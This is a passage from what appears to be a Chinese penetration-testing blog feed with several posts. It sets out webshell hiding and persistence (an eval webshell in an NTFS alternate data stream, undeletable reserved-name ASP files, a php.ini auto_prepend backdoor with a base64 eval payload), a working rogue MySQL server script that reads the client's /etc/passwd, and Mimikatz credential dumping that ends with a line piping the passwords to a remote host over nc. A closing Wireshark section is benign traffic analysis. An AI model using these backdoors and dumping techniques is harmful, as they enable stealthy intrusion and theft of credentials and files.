    <content type="html"><![CDATA[<h1 id="脚本权限维持–脚本隐藏"><a href="#脚本权限维持–脚本隐藏" class="headerlink" title="脚本权限维持–脚本隐藏"></a>脚本权限维持–脚本隐藏</h1><h2 id="创建系统隐藏文件"><a href="#创建系统隐藏文件" class="headerlink" title="创建系统隐藏文件"></a>创建系统隐藏文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +h 文件名</span><br></pre></td></tr></table></figure><p>先查看是否存在文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; dir | findstr <span class="string">&quot;mimi&quot;</span></span><br><span class="line">-a---        <span class="number">2020</span>/<span class="number">11</span>/<span class="number">18</span>  ?? <span class="number">09</span>:<span class="number">27</span>    <span class="number">1045256</span> mimikatz.exe</span><br></pre></td></tr></table></figure><p>执行之后查看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; dir | findstr <span class="string">&quot;mimi&quot;</span></span><br></pre></td></tr></table></figure><h2 id="利用ADS隐藏文件"><a href="#利用ADS隐藏文件" class="headerlink" title="利用ADS隐藏文件"></a>利用ADS隐藏文件</h2><p>NTFS交换数据流（Alternate　Data　Streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。</p><p>在资源管理器中却只能看到宿主文件，找不到寄宿文件。所有将shell文件作为寄宿文件。</p><h3 id="生成shell文件"><a href="#生成shell文件" class="headerlink" title="生成shell文件"></a>生成shell文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_REQUEST[1]);?&gt;&quot; &gt; index.php:shell.jpg</span><br></pre></td></tr></table></figure><h3 id="查看shell文件"><a href="#查看shell文件" class="headerlink" title="查看shell文件"></a>查看shell文件</h3><p>正常使用<code>dir</code>是看不到原文件到，我们需要使用<code>dir /r</code>，来查看，在文件夹中可以看到index.php，而看不到<code>index.php:shell.jpg</code>。</p><h3 id="利用shell文件"><a href="#利用shell文件" class="headerlink" title="利用shell文件"></a>利用shell文件</h3><p>文件包含<code>include.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&#39;index.php:shell.jpg&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>直接访问<code>include.php</code>，然后配合attrib隐藏include.php</p><h2 id="asp不死僵尸"><a href="#asp不死僵尸" class="headerlink" title="asp不死僵尸"></a>asp不死僵尸</h2><p>Windows下是不能以”aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9”这些系统保留文件名来命名文件或文件夹的，但是通过copy命令却可以实现，方法就是在cmd中输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy E:\steady\1.asp \\.\E:\steady\lpt2.wap.asp</span><br></pre></td></tr></table></figure><p>配合iis漏洞解析asp，在图形界面下根本无法删除，只能通过cmd中输入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\.\E:\Web\asp\wwwroot\lpt2.wap.asp</span><br></pre></td></tr></table></figure><h2 id="phpinfo查看是否开启环境变量-include-path"><a href="#phpinfo查看是否开启环境变量-include-path" class="headerlink" title="phpinfo查看是否开启环境变量 include_path"></a>phpinfo查看是否开启环境变量 include_path</h2><p>利用<code>include_path</code>为不常见路径，waf很难添加到规则，将文件放到改目录下，然后使用php文件包含。</p><p>比如：</p><p>在C盘，创建<code>C:\php\pear</code>目录，把木马文件上传去。</p><p>在网站根目录进行文件包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;c:\php\pear\1.png&quot;)?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-ini后门"><a href="#php-ini后门" class="headerlink" title="php.ini后门"></a>php.ini后门</h2><p>将后门写入<code>php.ini</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On</span><br><span class="line">auto_prepend_file=<span class="string">&quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="user-ini后门"><a href="#user-ini后门" class="headerlink" title="user.ini后门"></a>user.ini后门</h2><p>程序执行时会先寻找当前目录下是否存在 .user.ini 文件，如果没有会继续向根目录寻找，直到配置目录下的 php.ini。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1.</span>txt</span><br><span class="line">user_ini.cache_ttl = <span class="number">10</span>  <span class="comment">//设置加载时间为10s 不需要重启apache时间一到自动加载。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;脚本权限维持–脚本隐藏&quot;&gt;&lt;a href=&quot;#脚本权限维持–脚本隐藏&quot; class=&quot;headerlink&quot; title=&quot;脚本权限维持–脚本隐藏&quot;&gt;&lt;/a&gt;脚本权限维持–脚本隐藏&lt;/h1&gt;&lt;h2 id=&quot;创建系统隐藏文件&quot;&gt;&lt;a href=&quot;#创建系统隐藏文件&quot;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>mysql服务端伪造读取客户端文件</title>
    <link href="http://s1eady.top/2020/11/24/mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/"/>
    <id>http://s1eady.top/2020/11/24/mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6/</id>
    <published>2020-11-24T02:20:03.000Z</published>
    <updated>2020-11-24T01:45:09.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql服务端伪造读取客户端文件"><a href="#mysql服务端伪造读取客户端文件" class="headerlink" title="mysql服务端伪造读取客户端文件"></a>mysql服务端伪造读取客户端文件</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>伪造一个 MySQL 的服务端，当有客户端连接上这个假服务端的时候，我们就可以任意读取客户端的一个文件。在客户端发送查询之后，返回一个<code>Response TABULAR</code>数据包，并附上我们指定的文件，就可以读取客户端的文件了。伪造的服务端可以在任何时候回复一个 file-transfer 请求，不一定非要是在<code>LOAD DATA LOCAL</code>的时候。客户端必须具有 CLIENT_LOCAL_FILES 属性。</p><h2 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;1.txt&quot; into table TestTable;</span><br><span class="line">load data local infile &quot;&#x2F;1.txt&quot; into table TestTable;</span><br></pre></td></tr></table></figure><p>两者的功能都是读取文件，但是第一个读取的是服务端的文件，第二个读取的是客户端本地的文件。</p><p>注意：</p><p>如果你无法使用<code>LOAD DATA INFILE</code>语法的话，考虑在连接 MySQL 的时候加上<code>--enable-local-infile</code>选项，或者设置<code>local_infile</code>全局变量为<code>ON</code>。</p><h2 id="Wireshark分析"><a href="#Wireshark分析" class="headerlink" title="Wireshark分析"></a>Wireshark分析</h2><p>客户端请求<code>load data infile</code></p><p>服务端返回一个文件名称</p><p>客户端将文件内容传递给服务端</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">&quot;&quot;</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">&#x27;Conn from: %r&#x27;</span>, address)</span><br><span class="line">conn.sendall(<span class="string">&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">&quot;auth okay&quot;</span>)</span><br><span class="line">conn.sendall(<span class="string">&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">&quot;want file...&quot;</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">&quot;\x00\x00\x01\xFB&quot;</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>攻击机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python /Users/apple/Desktop/<span class="number">1.</span>py</span><br><span class="line">INFO:root:Conn <span class="keyword">from</span>: (<span class="string">&#x27;172.20.10.4&#x27;</span>, <span class="number">64412</span>)</span><br><span class="line">INFO:root:auth okay</span><br><span class="line">INFO:root:want file...</span><br><span class="line">INFO:root:<span class="string">&quot;##</span></span><br><span class="line"><span class="string"># User Database</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># Note that this file is consulted directly only when the system is running</span></span><br><span class="line"><span class="string"># in single-user mode.  At other times this information is provided by</span></span><br><span class="line"><span class="string"># Open Directory.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># See the opendirectoryd(8) man page for additional information about</span></span><br><span class="line"><span class="string"># Open Directory.</span></span><br><span class="line"><span class="string">##</span></span><br><span class="line"><span class="string">nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">root:*:0:0:System Administrator:/var/root:/bin/sh</span></span><br><span class="line"><span class="string">daemon:*:1:1:System Services:/var/root:/usr/bin/false</span></span><br><span class="line"><span class="string">_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico</span></span><br><span class="line"><span class="string">_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false</span></span><br><span class="line"><span class="string">_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false</span></span><br><span class="line"><span class="string">_postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false</span></span><br><span class="line"><span class="string">_scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false</span></span><br><span class="line"><span class="string">_appstore:*:33:33:Mac App Store Service:/var/db/appstore:/usr/bin/false</span></span><br></pre></td></tr></table></figure><p>受害机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot -h 172.20.10.4</span><br></pre></td></tr></table></figure><p>ps：</p><p>在phpMyAdmin里开启远程连接（将<code>phpMyAdmin/libraries/config.default.php的$cfg[&#39;AllowArbitraryServer&#39;]改为true</code>）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql服务端伪造读取客户端文件&quot;&gt;&lt;a href=&quot;#mysql服务端伪造读取客户端文件&quot; class=&quot;headerlink&quot; title=&quot;mysql服务端伪造读取客户端文件&quot;&gt;&lt;/a&gt;mysql服务端伪造读取客户端文件&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="mysql" scheme="http://s1eady.top/categories/mysql/"/>
    
    
    <category term="mysql" scheme="http://s1eady.top/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--Mimikatz的使用</title>
    <link href="http://s1eady.top/2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Mimikatz%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-23T02:11:12.000Z</published>
    <updated>2020-11-23T02:24:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取本地帐户密码"><a href="#获取本地帐户密码" class="headerlink" title="获取本地帐户密码"></a>获取本地帐户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p><p>cmd修改注册表命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">#重启或用户重新登录后可以成功抓取</span><br></pre></td></tr></table></figure><h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>为了方便复制与查看，可以输出到本地文件里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure><h3 id="Mimikatz-使用小技巧"><a href="#Mimikatz-使用小技巧" class="headerlink" title="Mimikatz 使用小技巧"></a>Mimikatz 使用小技巧</h3><h4 id="记录-Mimikatz输出"><a href="#记录-Mimikatz输出" class="headerlink" title="记录 Mimikatz输出"></a>记录 Mimikatz输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir</span><br></pre></td></tr></table></figure><h4 id="将输出导入到本地文件"><a href="#将输出导入到本地文件" class="headerlink" title="将输出导入到本地文件"></a>将输出导入到本地文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure><h4 id="将输出传输到远程机器"><a href="#将输出传输到远程机器" class="headerlink" title="将输出传输到远程机器"></a>将输出传输到远程机器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mimikatz&quot;&gt;&lt;a href=&quot;#Mimikatz&quot; class=&quot;headerlink&quot; title=&quot;Mimikatz&quot;&gt;&lt;/a&gt;Mimikatz&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>流量分析--Wireshark使用</title>
    <link href="http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--Wireshark%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-22T02:11:12.000Z</published>
    <updated>2020-11-06T11:22:21.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><h2 id="文件导出功能"><a href="#文件导出功能" class="headerlink" title="文件导出功能"></a>文件导出功能</h2><h3 id="http导出功能"><a href="#http导出功能" class="headerlink" title="http导出功能"></a>http导出功能</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/50.png" alt="50"></p><h3 id="foremost分离"><a href="#foremost分离" class="headerlink" title="foremost分离"></a>foremost分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 1.jpg</span><br></pre></td></tr></table></figure><h3 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tcpxtract -f &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="NetworkMiner"><a href="#NetworkMiner" class="headerlink" title="NetworkMiner"></a>NetworkMiner</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/49.png" alt="49"></p><h2 id="分析TCP"><a href="#分析TCP" class="headerlink" title="分析TCP"></a>分析TCP</h2><h3 id="tcpick"><a href="#tcpick" class="headerlink" title="tcpick"></a>tcpick</h3><p>由于网络通信协议众多，TCP连接状态众多，所以TCP分析较为复杂。Kali  Linux提供一款专用工具tcpick。该工具支持在线实时嗅探和离线文件嗅探。它可以自动过滤出TCP流，并列出不同出TCP的相关信息，如源和目标地址/端口号、连接状态。该工具可以自动重组流数据，按照不同的格式进行保存。同时，该工具可以在终端以多种显示重组前和重组后的数据包内容，便于用户进行分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpick -C -yP -r attachment.pcapng</span><br><span class="line">Starting tcpick <span class="number">0.2</span><span class="number">.1</span> at <span class="number">2020</span><span class="number">-11</span><span class="number">-05</span> <span class="number">18</span>:<span class="number">42</span> CST</span><br><span class="line">Timeout <span class="keyword">for</span> connections <span class="keyword">is</span> <span class="number">600</span></span><br><span class="line">tcpick: reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"><span class="number">1</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">nc -l -p <span class="number">4445</span> &gt; flag.zip</span><br><span class="line"><span class="number">2</span>      SYN-SENT       <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      SYN-RECEIVED   <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      ESTABLISHED    <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">PK....  ...NdbN..,.%...........flag.txtUT       ....z\..z\ux.............</span><br><span class="line">..(.y..z.. ..F.......:...<span class="comment">#B z..:...YPK....,.%.......PK......    ...NdbN..,.%.........................flag.txtUT.....z\ux.............PK..........N...w.....                                                                                                     </span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      FIN-WAIT<span class="number">-2</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line"><span class="number">2</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">37904</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4445</span></span><br><span class="line">unzip -P supercomplexpassword flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">  inflating: flag.txt                </span><br><span class="line"></span><br><span class="line"><span class="number">1</span>      FIN-WAIT<span class="number">-1</span>     <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      TIME-WAIT      <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">1</span>      CLOSED         <span class="number">192.168</span><span class="number">.56</span><span class="number">.2</span>:<span class="number">55366</span> &gt; <span class="number">192.168</span><span class="number">.56</span><span class="number">.104</span>:<span class="number">4444</span></span><br><span class="line">tcpick: done reading <span class="keyword">from</span> attachment.pcapng</span><br><span class="line"></span><br><span class="line"><span class="number">24</span> packets captured                                                                                                             </span><br><span class="line"><span class="number">2</span> tcp sessions detected</span><br></pre></td></tr></table></figure><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client -&gt; server: SYN</span><br><span class="line">server -&gt; client: SYN+ACK</span><br><span class="line">client -&gt; server: ACK</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">02:52:44.513700 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [S] , seq 3310420140,                 length 0</span><br><span class="line">02:52:44.692890 IP 93.184.216.34.80 &gt; 172.17.0.9.41038: Flags [S.], seq 1353235534, ack 3310420141, length 0</span><br><span class="line">02:52:44.692953 IP 172.17.0.9.41038 &gt; 93.184.216.34.80: Flags [.] ,                 ack 1353235535, length 0</span><br></pre></td></tr></table></figure><h4 id="第一次握手-SYN"><a href="#第一次握手-SYN" class="headerlink" title="第一次握手: SYN"></a>第一次握手: SYN</h4><p><code>#1</code> 包含以下信息：</p><ol><li><code>02:52:44.513700</code> 时刻，客户端主动向 server（93.184.216.34）发起一个 SYN 请求，请求建立连接</li><li>客户端请求的<strong>服务端端口是 80</strong>（HTTP 服务默认 80 端口），客户端使用的是<strong>临时端口</strong>（大于 1024）41038</li><li><code>#1</code> 序列号是 <code>3310420140</code>，这是客户端的初始序列号（客户端和服务端分别维护自己的序列号，两者没有关系；另外，初始序列号是系统选择的，一般不是 0）</li><li><code>#1</code> length 为 0，因为 SYN 包不带 TCP payload，所有信息都在 TCP header</li></ol><h4 id="第二次握手-SYN-ACK"><a href="#第二次握手-SYN-ACK" class="headerlink" title="第二次握手: 